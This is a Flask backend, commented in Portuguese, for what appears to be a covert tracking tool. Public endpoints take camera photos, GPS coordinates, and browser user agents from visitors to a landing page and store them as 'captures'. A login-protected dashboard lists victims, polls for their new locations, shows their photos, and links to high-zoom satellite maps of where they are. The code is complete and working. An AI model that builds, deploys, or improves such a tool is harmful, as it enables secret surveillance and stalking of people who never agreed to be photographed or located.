from flask import (
    Flask,
    request,
    render_template,
    jsonify,
    redirect,
    url_for,
    session,
    send_file
)

from uuid import uuid4
from datetime import datetime, timezone
from functools import wraps
from io import BytesIO
import os

from werkzeug.security import check_password_hash

from supabase_db import (
    create_capture,
    get_capture,
    get_all_captures,
    create_location,
    get_locations,
    get_last_location,
    create_photo,
    get_photos,
    get_photo_location,
    upload_photo,
    download_photo
)


# ============================================================
# CONFIGURAÇÃO
# ============================================================

ADMIN_USERNAME = os.environ.get(
    "ADMIN_USERNAME"
)

ADMIN_PASSWORD_HASH = os.environ.get(
    "ADMIN_PASSWORD_HASH"
)

SECRET_KEY = os.environ.get(
    "SECRET_KEY"
)


if not ADMIN_USERNAME:
    raise RuntimeError(
        "Variável ADMIN_USERNAME não configurada."
    )


if not ADMIN_PASSWORD_HASH:
    raise RuntimeError(
        "Variável ADMIN_PASSWORD_HASH não configurada."
    )


if not SECRET_KEY:
    raise RuntimeError(
        "Variável SECRET_KEY não configurada."
    )


# ============================================================
# FLASK
# ============================================================

app = Flask(__name__)

app.secret_key = SECRET_KEY

app.config.update(

    SESSION_COOKIE_SECURE=True,

    SESSION_COOKIE_HTTPONLY=True,

    SESSION_COOKIE_SAMESITE="Lax",

    PERMANENT_SESSION_LIFETIME=3600

)


# ============================================================
# FUNÇÕES AUXILIARES
# ============================================================

def now_utc():

    return datetime.now(
        timezone.utc
    ).isoformat()


def ensure_capture(
    capture_id,
    user_agent=""
):

    if not capture_id:
        return False

    existing = get_capture(
        capture_id
    )

    if existing:
        return True

    create_capture(
        capture_id=capture_id,
        created_at=now_utc(),
        user_agent=user_agent
    )

    return True


def make_maps_url(
    latitude,
    longitude
):

    return (
        "https://www.google.com/maps"
        f"?z=20&t=k"
        f"&q=loc:{latitude}+{longitude}"
    )


# ============================================================
# AUTENTICAÇÃO
# ============================================================

def login_required(function):

    @wraps(function)
    def decorated_function(
        *args,
        **kwargs
    ):

        if not session.get(
            "authenticated"
        ):

            return redirect(
                url_for("login")
            )

        return function(
            *args,
            **kwargs
        )

    return decorated_function


def api_login_required(function):

    @wraps(function)
    def decorated_function(
        *args,
        **kwargs
    ):

        if not session.get(
            "authenticated"
        ):

            return jsonify({

                "success": False,

                "error":
                    "Não autenticado"

            }), 401

        return function(
            *args,
            **kwargs
        )

    return decorated_function


# ============================================================
# LOGIN
# ============================================================

@app.route(
    "/login",
    methods=["GET", "POST"]
)
def login():

    if session.get(
        "authenticated"
    ):

        return redirect(
            url_for("dashboard")
        )


    error = None


    if request.method == "POST":

        username = request.form.get(
            "username",
            ""
        ).strip()


        password = request.form.get(
            "password",
            ""
        )


        valid_username = (
            username ==
            ADMIN_USERNAME
        )


        valid_password = False


        if valid_username:

            valid_password = (
                check_password_hash(
                    ADMIN_PASSWORD_HASH,
                    password
                )
            )


        if (
            valid_username
            and
            valid_password
        ):

            session.clear()

            session["authenticated"] = True

            session["username"] = (
                ADMIN_USERNAME
            )

            session.permanent = True


            return redirect(
                url_for("dashboard")
            )


        error = (
            "Usuário ou senha inválidos."
        )


    return render_template(
        "login.html",
        error=error
    )


# ============================================================
# LOGOUT
# ============================================================

@app.route("/logout")
def logout():

    session.clear()

    return redirect(
        url_for("login")
    )


# ============================================================
# PÁGINA PRINCIPAL
# ============================================================

@app.route("/")
def index():

    return render_template(
        "index.html"
    )


# ============================================================
# DASHBOARD
# ============================================================

@app.route("/dashboard")
@login_required
def dashboard():

    return render_template(
        "dashboard.html"
    )


# ============================================================
# RECEBER FOTO
# ============================================================

@app.post("/upload")
def upload():

    photo = request.files.get(
        "photo"
    )


    capture_id = request.form.get(
        "capture_id"
    )


    location_id = request.form.get(
        "location_id"
    )


    if photo is None:

        return jsonify({

            "success": False,

            "error":
                "Nenhuma foto recebida"

        }), 400


    if not capture_id:

        return jsonify({

            "success": False,

            "error":
                "capture_id ausente"

        }), 400


    try:

        ensure_capture(

            capture_id,

            request.headers.get(
                "User-Agent",
                ""
            )

        )


        filename = (
            f"{uuid4().hex}.jpg"
        )


        file_data = photo.read()


        upload_photo(

            file_data=file_data,

            filename=filename,

            content_type=(
                photo.content_type
                or
                "image/jpeg"
            )

        )


        location_id_value = None


        if location_id:

            try:

                location_id_value = int(
                    location_id
                )

            except (
                TypeError,
                ValueError
            ):

                location_id_value = None


        created_at = now_utc()


        photo_record = create_photo(

            capture_id=capture_id,

            location_id=location_id_value,

            filename=filename,

            created_at=created_at

        )


        return jsonify({

            "success": True,

            "photo_id":
                photo_record["id"],

            "capture_id":
                capture_id,

            "filename":
                filename

        })


    except Exception as e:

        return jsonify({

            "success": False,

            "error":
                str(e)

        }), 500


# ============================================================
# RECEBER LOCALIZAÇÃO
# ============================================================

@app.post("/location")
def location():

    data = request.get_json()


    if not data:

        return jsonify({

            "success": False,

            "error":
                "Nenhum dado recebido"

        }), 400


    capture_id = data.get(
        "capture_id"
    )


    latitude = data.get(
        "latitude"
    )


    longitude = data.get(
        "longitude"
    )


    accuracy = data.get(
        "accuracy"
    )


    if not capture_id:

        return jsonify({

            "success": False,

            "error":
                "capture_id ausente"

        }), 400


    if (
        latitude is None
        or
        longitude is None
    ):

        return jsonify({

            "success": False,

            "error":
                "Latitude ou longitude ausente"

        }), 400


    try:

        latitude = float(
            latitude
        )

        longitude = float(
            longitude
        )


        if accuracy is not None:

            accuracy = float(
                accuracy
            )


    except (
        TypeError,
        ValueError
    ):

        return jsonify({

            "success": False,

            "error":
                "Coordenadas inválidas"

        }), 400


    try:

        ensure_capture(

            capture_id,

            request.headers.get(
                "User-Agent",
                ""
            )

        )


        location_record = create_location(

            capture_id=capture_id,

            latitude=latitude,

            longitude=longitude,

            accuracy=accuracy,

            created_at=now_utc()

        )


        location_id = (
            location_record["id"]
        )


        return jsonify({

            "success": True,

            "location_id":
                location_id,

            "capture_id":
                capture_id,

            "latitude":
                latitude,

            "longitude":
                longitude,

            "accuracy":
                accuracy,

            "maps_url":
                make_maps_url(
                    latitude,
                    longitude
                )

        })


    except Exception as e:

        return jsonify({

            "success": False,

            "error":
                str(e)

        }), 500


# ============================================================
# API — LISTAR CAPTURAS
# ============================================================

@app.get("/api/captures")
@api_login_required
def api_captures():

    try:

        rows = get_all_captures()


        captures = []


        for row in rows:

            capture_id = (
                row["capture_id"]
            )


            locations = get_locations(
                capture_id
            )


            photos = get_photos(
                capture_id
            )


            captures.append({

                "capture_id":
                    capture_id,

                "created_at":
                    row["created_at"],

                "user_agent":
                    row.get(
                        "user_agent"
                    ),

                "location_count":
                    len(locations),

                "photo_count":
                    len(photos)

            })


        return jsonify({

            "success": True,

            "captures":
                captures

        })


    except Exception as e:

        return jsonify({

            "success": False,

            "error":
                str(e)

        }), 500


# ============================================================
# API — UMA CAPTURA
# ============================================================

@app.get(
    "/api/captures/<capture_id>"
)
@api_login_required
def api_capture(
    capture_id
):

    try:

        capture = get_capture(
            capture_id
        )


        if not capture:

            return jsonify({

                "success":
                    False,

                "error":
                    "Captura não encontrada"

            }), 404


        last_location = (
            get_last_location(
                capture_id
            )
        )


        locations = get_locations(
            capture_id
        )


        photos = get_photos(
            capture_id
        )


        capture_data = {

            "capture_id":
                capture[
                    "capture_id"
                ],

            "created_at":
                capture[
                    "created_at"
                ],

            "user_agent":
                capture.get(
                    "user_agent"
                )

        }


        if last_location:

            latitude = (
                last_location[
                    "latitude"
                ]
            )

            longitude = (
                last_location[
                    "longitude"
                ]
            )


            capture_data.update({

                "latitude":
                    latitude,

                "longitude":
                    longitude,

                "accuracy":
                    last_location.get(
                        "accuracy"
                    ),

                "maps_url":
                    make_maps_url(
                        latitude,
                        longitude
                    )

            })

        else:

            capture_data.update({

                "latitude":
                    None,

                "longitude":
                    None,

                "accuracy":
                    None,

                "maps_url":
                    None

            })


        location_data = []


        for row in locations:

            location_data.append({

                "id":
                    row["id"],

                "capture_id":
                    row["capture_id"],

                "latitude":
                    row["latitude"],

                "longitude":
                    row["longitude"],

                "accuracy":
                    row.get(
                        "accuracy"
                    ),

                "created_at":
                    row["created_at"]

            })


        photo_data = []


        for row in photos:

            location = (
                get_photo_location(
                    row.get(
                        "location_id"
                    )
                )
            )


            photo_data.append({

                "id":
                    row["id"],

                "capture_id":
                    row["capture_id"],

                "location_id":
                    row.get(
                        "location_id"
                    ),

                "filename":
                    row["filename"],

                "photo_url":
                    url_for(
                        "uploaded_file",
                        filename=row[
                            "filename"
                        ]
                    ),

                "created_at":
                    row["created_at"],

                "latitude":
                    (
                        location[
                            "latitude"
                        ]
                        if location
                        else None
                    ),

                "longitude":
                    (
                        location[
                            "longitude"
                        ]
                        if location
                        else None
                    ),

                "accuracy":
                    (
                        location[
                            "accuracy"
                        ]
                        if location
                        else None
                    )

            })


        return jsonify({

            "success":
                True,

            "capture":
                capture_data,

            "locations":
                location_data,

            "photos":
                photo_data

        })


    except Exception as e:

        return jsonify({

            "success":
                False,

            "error":
                str(e)

        }), 500


# ============================================================
# API — NOVAS LOCALIZAÇÕES
# ============================================================

@app.get(
    "/api/captures/<capture_id>/locations"
)
@api_login_required
def api_new_locations(
    capture_id
):

    after_id = request.args.get(

        "after_id",

        default=0,

        type=int

    )


    try:

        locations = get_locations(

            capture_id,

            after_id

        )


        location_data = []


        for row in locations:

            location_data.append({

                "id":
                    row["id"],

                "capture_id":
                    row["capture_id"],

                "latitude":
                    row["latitude"],

                "longitude":
                    row["longitude"],

                "accuracy":
                    row.get(
                        "accuracy"
                    ),

                "created_at":
                    row["created_at"]

            })


        return jsonify({

            "success":
                True,

            "locations":
                location_data

        })


    except Exception as e:

        return jsonify({

            "success":
                False,

            "error":
                str(e)

        }), 500


# ============================================================
# SERVIR IMAGENS DO SUPABASE STORAGE
# ============================================================

@app.get(
    "/uploads/<filename>"
)
@api_login_required
def uploaded_file(
    filename
):

    try:

        file_data = download_photo(
            filename
        )


        return send_file(

            BytesIO(file_data),

            mimetype="image/jpeg",

            download_name=filename

        )


    except Exception as e:

        return jsonify({

            "success":
                False,

            "error":
                str(e)

        }), 404


# ============================================================
# EXECUÇÃO LOCAL
# ============================================================

if __name__ == "__main__":

    port = int(
        os.environ.get(
            "PORT",
            5000
        )
    )


    app.run(

        host="0.0.0.0",

        port=port,

        debug=False

    )
